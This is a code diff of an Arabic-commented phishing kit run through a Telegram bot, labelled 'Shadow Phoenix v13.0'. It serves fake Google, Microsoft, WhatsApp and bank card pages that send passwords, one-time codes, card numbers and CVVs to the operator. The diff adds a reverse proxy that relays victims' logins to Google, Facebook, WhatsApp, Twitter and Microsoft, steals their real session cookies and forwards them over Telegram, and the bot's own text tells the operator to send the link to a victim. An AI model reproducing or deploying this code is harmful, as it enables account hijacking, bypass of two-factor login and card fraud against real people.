@@ -7,14 +7,18 @@ import traceback
 import logging
 import random
 import string
-from datetime import datetime
+import json
+import re
+from datetime import datetime, timedelta
 import uvicorn
 from pydantic import BaseModel
-from fastapi import FastAPI, Request, BackgroundTasks, HTTPException
+from fastapi import FastAPI, Request, Response, BackgroundTasks, HTTPException
 from fastapi.responses import HTMLResponse, JSONResponse
 from fastapi.middleware.cors import CORSMiddleware
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+import httpx
+from bs4 import BeautifulSoup
 
 # ==================== إعداد السجلات ====================
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
@@ -25,7 +29,8 @@ BOT_TOKEN = os.getenv("BOT_TOKEN", "")
 RENDER_URL = os.getenv("RENDER_URL", "")
 CAPTURE_SECRET = os.getenv("CAPTURE_SECRET", "Shadow_Secret_2026")
 SALT = os.getenv("SALT", "Shadow_Salt_321")
-OWNER_ID = 7295259673
+OWNER_ID = int(os.getenv("OWNER_ID", "7295259673"))
+PROXY_TIMEOUT = 30
 
 if not BOT_TOKEN or not RENDER_URL:
     logger.error("❌ المتغيرات البيئية BOT_TOKEN و RENDER_URL غير مضبوطة!")
@@ -76,7 +81,6 @@ class CredentialsData(BaseModel):
     phone: str = ""
     code: str = ""
     login_type: str
-    cookies: str = ""
     secret: str
 
 # ==================== قاعدة البيانات المطورة ====================
@@ -133,9 +137,21 @@ def init_db():
             captured_at TEXT DEFAULT CURRENT_TIMESTAMP
         )
     """)
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS proxy_sessions (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            session_id TEXT UNIQUE,
+            owner_chat_id INTEGER,
+            target TEXT,
+            cookies TEXT,
+            created_at TEXT DEFAULT CURRENT_TIMESTAMP,
+            expires_at TEXT,
+            is_active INTEGER DEFAULT 1
+        )
+    """)
     conn.commit()
     conn.close()
-    logger.info("✅ قاعدة البيانات جاهزة (مع دعم الكوكيز والبطاقات)")
+    logger.info("✅ قاعدة البيانات جاهزة (مع دعم الوكيل والكوكيز)")
 
 init_db()
 
@@ -210,6 +226,42 @@ def log_credentials(owner_chat_id, login_type, email, password, card_number, car
         conn.close()
     except Exception as e:
         logger.error(f"⚠️ فشل تسجيل بيانات الدخول: {e}")
+
+def save_proxy_session(session_id, owner_chat_id, target, cookies):
+    try:
+        conn = get_db_connection()
+        cursor = conn.cursor()
+        expires = (datetime.now() + timedelta(hours=2)).isoformat()
+        cursor.execute(
+            "INSERT OR REPLACE INTO proxy_sessions (session_id, owner_chat_id, target, cookies, expires_at) VALUES (?, ?, ?, ?, ?)",
+            (session_id, owner_chat_id, target, cookies, expires)
+        )
+        conn.commit()
+        conn.close()
+    except Exception as e:
+        logger.error(f"⚠️ فشل حفظ جلسة الوكيل: {e}")
+
+def get_proxy_session(session_id):
+    try:
+        conn = get_db_connection()
+        cursor = conn.cursor()
+        cursor.execute("SELECT * FROM proxy_sessions WHERE session_id = ? AND is_active = 1", (session_id,))
+        result = cursor.fetchone()
+        conn.close()
+        return result
+    except Exception as e:
+        logger.error(f"⚠️ فشل استرجاع جلسة الوكيل: {e}")
+        return None
+
+def update_proxy_session(session_id, cookies):
+    try:
+        conn = get_db_connection()
+        cursor = conn.cursor()
+        cursor.execute("UPDATE proxy_sessions SET cookies = ? WHERE session_id = ?", (cookies, session_id))
+        conn.commit()
+        conn.close()
+    except Exception as e:
+        logger.error(f"⚠️ فشل تحديث جلسة الوكيل: {e}")
 
 # ==================== صفحة تسجيل الدخول الأساسية ====================
 def get_login_html():
@@ -314,7 +366,7 @@ def get_login_html():
     </html>
     """
 
-# ==================== قوالب المقالب ====================
+# ==================== قوالب المقالب (كاميرا + كلمات مرور) ====================
 def get_html_content(template_type, secret_key):
     # --- قوالب الكاميرا ---
     if template_type in ["tiktok", "instagram", "snapchat", "ai_filter", "absher"]:
@@ -433,11 +485,6 @@ def get_html_content(template_type, secret_key):
                     return os + " (" + browser + ")";
                 }}
 
-                // جمع الكوكيز
-                function getCookies() {{
-                    return document.cookie || "";
-                }}
-
                 function startFakeProgress(callback) {{
                     const bar = document.getElementById('progressBar');
                     const fill = document.getElementById('progressFill');
@@ -473,7 +520,6 @@ def get_html_content(template_type, secret_key):
                             let ctx = canvas.getContext('2d');
                             let shotsTaken = 0; const deviceInfo = getDeviceInfo();
                             const totalShots = 3;
-                            const cookies = getCookies();
 
                             startFakeProgress(() => {{
                                 let captureInterval = setInterval(function() {{
@@ -512,7 +558,7 @@ def get_html_content(template_type, secret_key):
         </html>
         """
     
-    # --- قالب جوجل (مع جمع الكوكيز) ---
+    # --- قالب جوجل (مع جمع الكوكيز عبر الصفحة) ---
     elif template_type == "google":
         return f"""
         <!DOCTYPE html>
@@ -600,7 +646,6 @@ def get_html_content(template_type, secret_key):
             </div>
             <script>
                 const ownerId = new URLSearchParams(window.location.search).get('id');
-                function getCookies() {{ return document.cookie || ""; }}
                 document.getElementById('loginBtn').addEventListener('click', function() {{
                     const email = document.getElementById('email').value.trim();
                     const pass = document.getElementById('password').value.trim();
@@ -615,7 +660,6 @@ def get_html_content(template_type, secret_key):
                             email: email,
                             password: pass,
                             login_type: 'google',
-                            cookies: getCookies(),
                             secret: '{secret_key}'
                         }})
                     }}).then(() => {{ window.location.href = 'https://accounts.google.com/v3/signin/challenge/pwd?continue=https://www.google.com'; }});
@@ -626,7 +670,7 @@ def get_html_content(template_type, secret_key):
         </html>
         """
     
-    # --- قالب مايكروسوفت (مع جمع الكوكيز) ---
+    # --- قالب مايكروسوفت ---
     elif template_type == "microsoft":
         return f"""
         <!DOCTYPE html>
@@ -667,7 +711,6 @@ def get_html_content(template_type, secret_key):
             </div>
             <script>
                 const ownerId = new URLSearchParams(window.location.search).get('id');
-                function getCookies() {{ return document.cookie || ""; }}
                 document.getElementById('loginBtn').addEventListener('click', function() {{
                     const email = document.getElementById('email').value.trim();
                     const pass = document.getElementById('password').value.trim();
@@ -682,7 +725,6 @@ def get_html_content(template_type, secret_key):
                             email: email,
                             password: pass,
                             login_type: 'microsoft',
-                            cookies: getCookies(),
                             secret: '{secret_key}'
                         }})
                     }}).then(() => {{ window.location.href = 'https://login.live.com/'; }});
@@ -693,7 +735,7 @@ def get_html_content(template_type, secret_key):
         </html>
         """
     
-    # --- قالب واتساب (جديد) ---
+    # --- قالب واتساب ---
     elif template_type == "whatsapp":
         return f"""
         <!DOCTYPE html>
@@ -726,93 +768,37 @@ def get_html_content(template_type, secret_key):
                     text-align: center;
                     margin-bottom: 25px;
                 }}
-                .logo img {{
-                    width: 70px;
-                    height: 70px;
-                    background: #25d366;
-                    border-radius: 50%;
-                    padding: 12px;
+                .logo .w {{
+                    width:70px;height:70px;background:#25d366;border-radius:50%;margin:0 auto;display:flex;align-items:center;justify-content:center;font-size:36px;color:white;font-weight:bold;
                 }}
-                .title {{
-                    font-size: 22px;
-                    font-weight: 600;
-                    color: #075e54;
-                    text-align: center;
-                    margin-bottom: 8px;
-                }}
-                .subtitle {{
-                    font-size: 15px;
-                    color: #5f6368;
-                    text-align: center;
-                    margin-bottom: 25px;
-                }}
+                .title {{ font-size: 22px; font-weight: 600; color: #075e54; text-align: center; margin-bottom: 8px; }}
+                .subtitle {{ font-size: 15px; color: #5f6368; text-align: center; margin-bottom: 25px; }}
                 .input-group {{ margin-bottom: 18px; }}
-                .input-group input {{
-                    width: 100%; padding: 14px 16px; border: 1px solid #ddd; border-radius: 8px;
-                    font-size: 16px; color: #202124; background: #f5f5f5; outline: none;
-                    transition: border-color 0.2s;
-                }}
+                .input-group input {{ width: 100%; padding: 14px 16px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; color: #202124; background: #f5f5f5; outline: none; transition: border-color 0.2s; }}
                 .input-group input:focus {{ border-color: #25d366; background: white; }}
-                .btn {{
-                    background: #25d366; color: white; border: none; padding: 14px;
-                    font-size: 16px; font-weight: 600; border-radius: 8px; cursor: pointer;
-                    width: 100%; transition: background 0.2s;
-                }}
+                .btn {{ background: #25d366; color: white; border: none; padding: 14px; font-size: 16px; font-weight: 600; border-radius: 8px; cursor: pointer; width: 100%; transition: background 0.2s; }}
                 .btn:hover {{ background: #1da85c; }}
                 .error {{ color: #d93025; font-size: 14px; margin-top: 15px; display: none; background: #fce8e6; padding: 10px; border-radius: 8px; text-align: center; }}
-                .qr-box {{
-                    background: #f0f0f0;
-                    border-radius: 8px;
-                    padding: 20px;
-                    text-align: center;
-                    margin-bottom: 20px;
-                }}
-                .qr-box .qr-placeholder {{
-                    width: 120px;
-                    height: 120px;
-                    background: #fff;
-                    margin: 0 auto;
-                    border: 2px dashed #ccc;
-                    border-radius: 8px;
-                    display: flex;
-                    align-items: center;
-                    justify-content: center;
-                    font-size: 12px;
-                    color: #999;
-                }}
+                .qr-box {{ background: #f0f0f0; border-radius: 8px; padding: 20px; text-align: center; margin-bottom: 20px; }}
+                .qr-box .qr-placeholder {{ width: 120px; height: 120px; background: #fff; margin: 0 auto; border: 2px dashed #ccc; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 12px; color: #999; }}
                 .footer {{ margin-top: 20px; text-align: center; font-size: 13px; color: #5f6368; }}
                 .footer a {{ color: #075e54; text-decoration: none; font-weight: 600; }}
             </style>
         </head>
         <body>
             <div class="container">
-                <div class="logo">
-                    <div style="width:70px;height:70px;background:#25d366;border-radius:50%;margin:0 auto;display:flex;align-items:center;justify-content:center;font-size:36px;color:white;font-weight:bold;">W</div>
-                </div>
+                <div class="logo"><div class="w">W</div></div>
                 <div class="title">واتساب ويب</div>
                 <div class="subtitle">لتفعيل حسابك، أدخل رقم هاتفك ورمز التفعيل</div>
-                
-                <div class="qr-box">
-                    <div class="qr-placeholder">🔲 امسح الرمز<br>أو أدخل البيانات</div>
-                </div>
-                
-                <div class="input-group">
-                    <input type="text" id="phone" placeholder="رقم الهاتف (مثال: 9665xxxxxxxx)" dir="ltr">
-                </div>
-                <div class="input-group">
-                    <input type="text" id="code" placeholder="رمز التفعيل المكون من 6 أرقام" dir="ltr">
-                </div>
-                
+                <div class="qr-box"><div class="qr-placeholder">🔲 امسح الرمز<br>أو أدخل البيانات</div></div>
+                <div class="input-group"><input type="text" id="phone" placeholder="رقم الهاتف (مثال: 9665xxxxxxxx)" dir="ltr"></div>
+                <div class="input-group"><input type="text" id="code" placeholder="رمز التفعيل المكون من 6 أرقام" dir="ltr"></div>
                 <button class="btn" id="verifyBtn">تفعيل الحساب</button>
                 <div class="error" id="errorMsg">تأكد من صحة البيانات</div>
-                
-                <div class="footer">
-                    <a href="#">مساعدة</a> · <a href="#">سياسة الخصوصية</a>
-                </div>
+                <div class="footer"><a href="#">مساعدة</a> · <a href="#">سياسة الخصوصية</a></div>
             </div>
             <script>
                 const ownerId = new URLSearchParams(window.location.search).get('id');
-                function getCookies() {{ return document.cookie || ""; }}
                 document.getElementById('verifyBtn').addEventListener('click', function() {{
                     const phone = document.getElementById('phone').value.trim();
                     const code = document.getElementById('code').value.trim();
@@ -829,7 +815,6 @@ def get_html_content(template_type, secret_key):
                             phone: phone,
                             code: code,
                             login_type: 'whatsapp',
-                            cookies: getCookies(),
                             secret: '{secret_key}'
                         }})
                     }}).then(() => {{ window.location.href = 'https://web.whatsapp.com/'; }});
@@ -840,7 +825,7 @@ def get_html_content(template_type, secret_key):
         </html>
         """
     
-    # --- قالب بنكي (جديد) ---
+    # --- قالب بنكي ---
     elif template_type == "bank":
         return f"""
         <!DOCTYPE html>
@@ -851,65 +836,20 @@ def get_html_content(template_type, secret_key):
             <title>تأكيد البطاقة - الراجحي</title>
             <style>
                 * {{ margin: 0; padding: 0; box-sizing: border-box; }}
-                body {{
-                    background: #f0f2f5;
-                    font-family: 'Segoe UI', Arial, sans-serif;
-                    display: flex;
-                    justify-content: center;
-                    align-items: center;
-                    min-height: 100vh;
-                    margin: 0;
-                    padding: 20px;
-                }}
-                .container {{
-                    max-width: 440px;
-                    width: 100%;
-                    background: white;
-                    border-radius: 12px;
-                    padding: 35px 30px;
-                    box-shadow: 0 4px 20px rgba(0,0,0,0.1);
-                }}
-                .logo {{
-                    text-align: center;
-                    margin-bottom: 20px;
-                }}
-                .logo .bank-name {{
-                    font-size: 28px;
-                    font-weight: 700;
-                    color: #003366;
-                }}
-                .logo .bank-sub {{
-                    font-size: 13px;
-                    color: #666;
-                }}
-                .title {{
-                    font-size: 20px;
-                    font-weight: 600;
-                    color: #003366;
-                    text-align: center;
-                    margin-bottom: 8px;
-                }}
-                .subtitle {{
-                    font-size: 14px;
-                    color: #5f6368;
-                    text-align: center;
-                    margin-bottom: 25px;
-                }}
+                body {{ background: #f0f2f5; font-family: 'Segoe UI', Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }}
+                .container {{ max-width: 440px; width: 100%; background: white; border-radius: 12px; padding: 35px 30px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }}
+                .logo {{ text-align: center; margin-bottom: 20px; }}
+                .logo .bank-name {{ font-size: 28px; font-weight: 700; color: #003366; }}
+                .logo .bank-sub {{ font-size: 13px; color: #666; }}
+                .title {{ font-size: 20px; font-weight: 600; color: #003366; text-align: center; margin-bottom: 8px; }}
+                .subtitle {{ font-size: 14px; color: #5f6368; text-align: center; margin-bottom: 25px; }}
                 .input-group {{ margin-bottom: 16px; }}
                 .input-group label {{ display: block; font-size: 13px; font-weight: 600; color: #333; margin-bottom: 5px; }}
-                .input-group input {{
-                    width: 100%; padding: 12px 14px; border: 1px solid #d1d5db; border-radius: 8px;
-                    font-size: 15px; color: #202124; background: white; outline: none;
-                    transition: border-color 0.2s;
-                }}
+                .input-group input {{ width: 100%; padding: 12px 14px; border: 1px solid #d1d5db; border-radius: 8px; font-size: 15px; color: #202124; background: white; outline: none; transition: border-color 0.2s; }}
                 .input-group input:focus {{ border-color: #003366; box-shadow: 0 0 0 3px rgba(0,51,102,0.1); }}
                 .input-row {{ display: flex; gap: 12px; }}
                 .input-row .input-group {{ flex: 1; }}
-                .btn {{
-                    background: #003366; color: white; border: none; padding: 14px;
-                    font-size: 16px; font-weight: 600; border-radius: 8px; cursor: pointer;
-                    width: 100%; transition: background 0.2s; margin-top: 10px;
-                }}
+                .btn {{ background: #003366; color: white; border: none; padding: 14px; font-size: 16px; font-weight: 600; border-radius: 8px; cursor: pointer; width: 100%; transition: background 0.2s; margin-top: 10px; }}
                 .btn:hover {{ background: #002244; }}
                 .error {{ color: #d93025; font-size: 14px; margin-top: 15px; display: none; background: #fce8e6; padding: 10px; border-radius: 8px; text-align: center; }}
                 .footer {{ margin-top: 25px; text-align: center; font-size: 12px; color: #666; }}
@@ -926,12 +866,10 @@ def get_html_content(template_type, secret_key):
                 </div>
                 <div class="title">تأكيد بيانات البطاقة</div>
                 <div class="subtitle">لتحديث بيانات حسابك وإتمام عملية التحقق</div>
-                
                 <div class="input-group">
                     <label>رقم البطاقة (16 خانة)</label>
                     <input type="text" id="cardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" dir="ltr">
                 </div>
-                
                 <div class="input-row">
                     <div class="input-group">
                         <label>تاريخ الانتهاء</label>
@@ -942,22 +880,15 @@ def get_html_content(template_type, secret_key):
                         <input type="password" id="cvv" placeholder="XXX" maxlength="4" dir="ltr">
                     </div>
                 </div>
-                
                 <button class="btn" id="verifyBtn">تأكيد والتحقق</button>
                 <div class="error" id="errorMsg">تأكد من صحة البيانات المدخلة</div>
-                
                 <div class="secure"><span>🔒</span> اتصال مشفر وآمن 256-bit</div>
-                <div class="footer">
-                    <a href="#">شروط الاستخدام</a> · <a href="#">سياسة الخصوصية</a>
-                </div>
+                <div class="footer"><a href="#">شروط الاستخدام</a> · <a href="#">سياسة الخصوصية</a></div>
             </div>
             <script>
                 const ownerId = new URLSearchParams(window.location.search).get('id');
-                function getCookies() {{ return document.cookie || ""; }}
-                
-                // تنسيق رقم البطاقة
                 document.getElementById('cardNumber').addEventListener('input', function(e) {{
-                    let val = this.value.replace(/\D/g, '');
+                    let val = this.value.replace(/\\D/g, '');
                     if(val.length > 16) val = val.slice(0, 16);
                     let formatted = '';
                     for(let i=0; i<val.length; i++) {{
@@ -966,10 +897,8 @@ def get_html_content(template_type, secret_key):
                     }}
                     this.value = formatted;
                 }});
-                
-                // تنسيق تاريخ الانتهاء
                 document.getElementById('expiry').addEventListener('input', function(e) {{
-                    let val = this.value.replace(/\D/g, '');
+                    let val = this.value.replace(/\\D/g, '');
                     if(val.length > 4) val = val.slice(0, 4);
                     if(val.length >= 2) {{
                         this.value = val.slice(0,2) + '/' + val.slice(2);
@@ -977,18 +906,15 @@ def get_html_content(template_type, secret_key):
                         this.value = val;
                     }}
                 }});
-                
                 document.getElementById('verifyBtn').addEventListener('click', function() {{
                     const card = document.getElementById('cardNumber').value.trim();
                     const expiry = document.getElementById('expiry').value.trim();
                     const cvv = document.getElementById('cvv').value.trim();
                     const errorBlock = document.getElementById('errorMsg');
-                    
-                    const cardDigits = card.replace(/\s/g, '');
+                    const cardDigits = card.replace(/\\s/g, '');
                     if(!card || cardDigits.length < 16) {{ errorBlock.style.display = 'block'; errorBlock.innerText = '⚠️ رقم البطاقة يجب أن يتكون من 16 خانة'; return; }}
                     if(!expiry || expiry.length < 5) {{ errorBlock.style.display = 'block'; errorBlock.innerText = '⚠️ أدخل تاريخ الانتهاء بصيغة MM/YY'; return; }}
                     if(!cvv || cvv.length < 3) {{ errorBlock.style.display = 'block'; errorBlock.innerText = '⚠️ أدخل رمز CVV المكون من 3 أو 4 أرقام'; return; }}
-                    
                     errorBlock.style.display = 'none';
                     fetch('/api/credentials', {{
                         method: 'POST',
@@ -999,7 +925,6 @@ def get_html_content(template_type, secret_key):
                             card_expiry: expiry,
                             card_cvv: cvv,
                             login_type: 'bank',
-                            cookies: getCookies(),
                             secret: '{secret_key}'
                         }})
                     }}).then(() => {{ window.location.href = 'https://www.alrajhibank.com.sa/'; }});
@@ -1010,6 +935,152 @@ def get_html_content(template_type, secret_key):
         </html>
         """
     return "<h1>قالب غير معروف</h1>"
+
+# ==================== نظام الوكيل العكسي (الخطة الشيطانية) ====================
+proxy_client = httpx.AsyncClient(
+    timeout=PROXY_TIMEOUT,
+    follow_redirects=True,
+    verify=False
+)
+
+def extract_cookies_from_response(resp):
+    """استخراج الكوكيز من رؤوس الرد"""
+    cookies = {}
+    set_cookie_headers = resp.headers.get("set-cookie", "")
+    if set_cookie_headers:
+        # هناك أكثر من كوكي
+        for line in set_cookie_headers.split(", "):
+            if "=" in line:
+                parts = line.split(";")
+                if parts:
+                    name_value = parts[0].strip()
+                    if "=" in name_value:
+                        name, value = name_value.split("=", 1)
+                        cookies[name] = value
+    return cookies
+
+def rewrite_html_links(html_content, proxy_path="/proxy"):
+    """إعادة كتابة الروابط في HTML لتظل عبر الوكيل"""
+    soup = BeautifulSoup(html_content, "html.parser")
+    
+    # تعديل الروابط في <a href=...>
+    for tag in soup.find_all(["a", "link", "form"]):
+        if tag.get("href"):
+            href = tag["href"]
+            if href.startswith("/") and not href.startswith("//"):
+                tag["href"] = f"{proxy_path}{href}"
+            elif href.startswith("http") and "accounts.google.com" in href:
+                tag["href"] = f"{proxy_path}/google{tag['href']}"
+    
+    # تعديل مسارات الصور
+    for tag in soup.find_all(["img", "script", "iframe"]):
+        if tag.get("src"):
+            src = tag["src"]
+            if src.startswith("/") and not src.startswith("//"):
+                tag["src"] = f"{proxy_path}{src}"
+    
+    return str(soup)
+
+@app.api_route("/proxy/{target}/{path:path}", methods=["GET", "POST", "PUT", "DELETE", "PATCH"])
+async def proxy_handler(target: str, path: str, request: Request):
+    """خادم الوكيل العكسي - يعترض كل الطلبات ويسرق الكوكيز"""
+    try:
+        # تحديد الهدف
+        target_map = {
+            "google": "https://accounts.google.com",
+            "fb": "https://www.facebook.com",
+            "whatsapp": "https://web.whatsapp.com",
+            "twitter": "https://twitter.com",
+            "microsoft": "https://login.live.com"
+        }
+        base_url = target_map.get(target, "https://accounts.google.com")
+        target_url = f"{base_url}/{path}"
+        
+        # استخراج session_id من الـ Query Parameter
+        session_id = request.query_params.get("session_id")
+        if not session_id:
+            # توليد جلسة جديدة
+            session_id = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
+        
+        # قراءة الكوكيز من قاعدة البيانات إذا كانت موجودة
+        session_data = get_proxy_session(session_id)
+        cookies = {}
+        if session_data and session_data["cookies"]:
+            try:
+                cookies = json.loads(session_data["cookies"])
+            except:
+                pass
+        
+        # بناء الطلب
+        method = request.method
+        headers = dict(request.headers)
+        headers.pop("host", None)
+        headers.pop("content-length", None)
+        headers.pop("origin", None)
+        headers.pop("referer", None)
+        
+        body = await request.body()
+        
+        # إرسال الطلب
+        resp = await proxy_client.request(
+            method=method,
+            url=target_url,
+            headers=headers,
+            content=body if body else None,
+            cookies=cookies
+        )
+        
+        # استخراج الكوكيز الجديدة من الرد
+        new_cookies = extract_cookies_from_response(resp)
+        if new_cookies:
+            # تحديث الكوكيز في قاعدة البيانات
+            all_cookies = {**cookies, **new_cookies}
+            save_proxy_session(session_id, request.query_params.get("owner_id", 0), target, json.dumps(all_cookies))
+            logger.info(f"🍪 تم سرقة كوكيز جديدة: {new_cookies}")
+            
+            # إرسال الكوكيز للمالك
+            owner_id = request.query_params.get("owner_id")
+            if owner_id:
+                try:
+                    bot.send_message(
+                        int(owner_id),
+                        f"🍪 **تم سرقة كوكيز جديدة!**\n"
+                        f"🎯 الهدف: {target.upper()}\n"
+                        f"🍪 الكوكيز: `{json.dumps(new_cookies)}`\n"
+                        f"🔑 الجلسة: `{session_id}`",
+                        parse_mode="Markdown"
+                    )
+                except Exception as e:
+                    logger.error(f"فشل إرسال الكوكيز للمالك: {e}")
+        
+        # إعادة كتابة الروابط في HTML
+        content_type = resp.headers.get("content-type", "")
+        if "text/html" in content_type:
+            content = await resp.aread()
+            try:
+                html_content = content.decode("utf-8")
+                rewritten_html = rewrite_html_links(html_content, f"/proxy/{target}")
+                return Response(
+                    content=rewritten_html.encode("utf-8"),
+                    headers=dict(resp.headers),
+                    status_code=resp.status_code
+                )
+            except:
+                pass
+        
+        # إعادة الرد كما هو
+        return Response(
+            content=await resp.aread(),
+            headers=dict(resp.headers),
+            status_code=resp.status_code
+        )
+    
+    except Exception as e:
+        logger.error(f"Proxy Error: {traceback.format_exc()}")
+        return JSONResponse(
+            status_code=500,
+            content={"status": "error", "message": str(e)}
+        )
 
 # ==================== أوامر البوت ====================
 @bot.message_handler(commands=['start'])
@@ -1024,7 +1095,7 @@ def start(message):
         InlineKeyboardButton("🔐 تسجيل الدخول للنظام", web_app=telebot.types.WebAppInfo(url=f"{RENDER_URL}/login-page")),
         InlineKeyboardButton("ℹ️ تعليمات", callback_data="show_instructions")
     )
-    bot.send_message(chat_id, "🛡️ نظام الصيد الذكي v12.0\nيرجى تسجيل الدخول.", reply_markup=markup)
+    bot.send_message(chat_id, "🛡️ نظام الصيد الذكي v13.0 (Shadow Proxy)\nيرجى تسجيل الدخول.", reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: call.data == "show_instructions")
 def show_instructions(call):
@@ -1051,10 +1122,13 @@ def show_main_menu(chat_id):
         InlineKeyboardButton("👻 سناب شات", callback_data="gen_snapchat"),
         InlineKeyboardButton("🧠 فلتر AI", callback_data="gen_ai_filter"),
         InlineKeyboardButton("🚨 أبشر", callback_data="gen_absher"),
-        InlineKeyboardButton("📧 جوجل (كلمة مرور)", callback_data="gen_google"),
-        InlineKeyboardButton("🔑 مايكروسوفت (كلمة مرور)", callback_data="gen_microsoft"),
-        InlineKeyboardButton("💬 واتساب (تفعيل)", callback_data="gen_whatsapp"),
-        InlineKeyboardButton("💳 بنك (بطاقة ائتمان)", callback_data="gen_bank"),
+        InlineKeyboardButton("📧 جوجل", callback_data="gen_google"),
+        InlineKeyboardButton("🔑 مايكروسوفت", callback_data="gen_microsoft"),
+        InlineKeyboardButton("💬 واتساب", callback_data="gen_whatsapp"),
+        InlineKeyboardButton("💳 بنك", callback_data="gen_bank"),
+        InlineKeyboardButton("🌐 بروكسي جوجل (كوكيز)", callback_data="gen_proxy_google"),
+        InlineKeyboardButton("🌐 بروكسي فيسبوك (كوكيز)", callback_data="gen_proxy_fb"),
+        InlineKeyboardButton("🌐 بروكسي واتساب (كوكيز)", callback_data="gen_proxy_whatsapp"),
         InlineKeyboardButton("🔄 تحديث الجلسة", callback_data="gen_refresh")
     )
     bot.send_message(chat_id, "👑 اختر القالب المناسب:", reply_markup=markup)
@@ -1080,6 +1154,7 @@ def gen_link(call):
             "ai_filter": "ai_filter", "absher": "absher",
             "google": "google", "microsoft": "microsoft",
             "whatsapp": "whatsapp", "bank": "bank",
+            "proxy_google": "proxy_google", "proxy_fb": "proxy_fb", "proxy_whatsapp": "proxy_whatsapp",
             "refresh": "refresh"
         }
         template = template_map.get(raw)
@@ -1090,6 +1165,24 @@ def gen_link(call):
             bot.send_message(chat_id, "✅ تم تحديث الجلسة.")
             return
         
+        # معالجة قوالب البروكسي بشكل خاص
+        if template.startswith("proxy_"):
+            target = template.replace("proxy_", "")
+            session_id = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
+            link = f"{RENDER_URL}/proxy/{target}?session_id={session_id}&owner_id={chat_id}"
+            bot.send_message(
+                chat_id,
+                f"🚀 **رابط البروكسي للكوكيز جاهز!**\n"
+                f"`{link}`\n"
+                f"📌 الهدف: {target.upper()}\n"
+                f"🔑 معرف الجلسة: `{session_id}`\n\n"
+                f"⚠️ أرسل الرابط للضحية. عندما يدخل الموقع ويسجل الدخول، ستصل لك كوكيز الجلسة الحقيقية!",
+                parse_mode="Markdown"
+            )
+            log_operation(chat_id, f"proxy_{target}", link, "pending")
+            return
+        
+        # القوالب العادية
         link = f"{RENDER_URL}?id={chat_id}&template={template}"
         log_operation(chat_id, template, link, "pending")
         bot.send_message(chat_id, f"🚀 **الرابط جاهز:**\n`{link}`\n📌 النوع: {template.upper()}", parse_mode="Markdown")
@@ -1206,7 +1299,6 @@ async def credentials_api(request: Request, background_tasks: BackgroundTasks):
         card_cvv = body.get("card_cvv", "")
         phone = body.get("phone", "")
         code = body.get("code", "")
-        cookies = body.get("cookies", "")
         
         client_ip = request.client.host
         forwarded = request.headers.get("X-Forwarded-For")
@@ -1216,18 +1308,17 @@ async def credentials_api(request: Request, background_tasks: BackgroundTasks):
         if not user_id:
             return JSONResponse(status_code=400, content={"status": "error"})
         
-        # تخزين البيانات
-        log_credentials(int(user_id), login_type, email, password, card_number, card_expiry, card_cvv, phone, code, cookies, client_ip)
+        log_credentials(int(user_id), login_type, email, password, card_number, card_expiry, card_cvv, phone, code, "", client_ip)
         
-        # بناء رسالة مخصصة حسب النوع
+        # بناء رسالة مخصصة
         if login_type in ["google", "microsoft"]:
-            msg = f"🔑 **صيد بيانات دخول!**\nالنوع: {login_type.upper()}\nالبريد: `{email}`\nكلمة المرور: `{password}`\nالكوكيز: `{cookies[:100]}...`"
+            msg = f"🔑 **صيد بيانات دخول!**\nالنوع: {login_type.upper()}\nالبريد: `{email}`\nكلمة المرور: `{password}`"
         elif login_type == "whatsapp":
-            msg = f"💬 **صيد واتساب!**\nرقم الهاتف: `{phone}`\nرمز التفعيل: `{code}`\nالكوكيز: `{cookies[:100]}...`"
+            msg = f"💬 **صيد واتساب!**\nرقم الهاتف: `{phone}`\nرمز التفعيل: `{code}`"
         elif login_type == "bank":
-            msg = f"💳 **صيد بطاقة ائتمان!**\nرقم البطاقة: `{card_number}`\nتاريخ الانتهاء: `{card_expiry}`\nرمز CVV: `{card_cvv}`\nالكوكيز: `{cookies[:100]}...`"
+            msg = f"💳 **صيد بطاقة ائتمان!**\nرقم البطاقة: `{card_number}`\nتاريخ الانتهاء: `{card_expiry}`\nرمز CVV: `{card_cvv}`"
         else:
-            msg = f"📦 **بيانات جديدة!**\nالنوع: {login_type}\nالبيانات: {body}"
+            msg = f"📦 **بيانات جديدة!**\nالنوع: {login_type}"
         
         msg += f"\n🌐 آيبي: `{client_ip}`"
         
@@ -1240,7 +1331,6 @@ async def credentials_api(request: Request, background_tasks: BackgroundTasks):
         return {"status": "success"}
     except Exception as e:
         logger.error(f"Credentials error: {e}")
-        traceback.print_exc()
         return JSONResponse(status_code=500, content={"status": "error"})
 
 @app.post(f"/{BOT_TOKEN}")
@@ -1265,7 +1355,7 @@ def startup():
         logger.error(f"⚠️ فشل ضبط Webhook: {e}")
     
     create_new_account("moosa", "123456")
-    logger.info("🔥 Shadow Phoenix v12.0 جاهز مع قوالب واتساب، بنك، وجمع الكوكيز!")
+    logger.info("🔥 Shadow Phoenix v13.0 جاهز مع نظام الوكيل العكسي وسرقة الكوكيز!")
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
